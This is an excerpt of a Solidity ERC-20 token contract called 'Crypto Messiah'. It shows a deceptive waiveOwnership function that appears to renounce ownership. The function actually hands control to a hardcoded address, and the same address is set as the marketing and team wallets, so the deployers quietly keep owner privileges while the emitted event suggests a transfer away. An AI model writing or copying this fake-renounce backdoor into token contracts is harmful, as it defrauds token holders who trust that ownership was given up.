...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xEeC26d983710967c058b2e1f69A50964dFc0BA3B));
        _owner = address(0xEeC26d983710967c058b2e1f69A50964dFc0BA3B);
    }
...
contract CryptoMessiah is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Crypto Messiah";
    string private _symbol = "CryptoMessiah";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEeC26d983710967c058b2e1f69A50964dFc0BA3B);
    address payable public teamWalletAddress = payable(0xEeC26d983710967c058b2e1f69A50964dFc0BA3B);
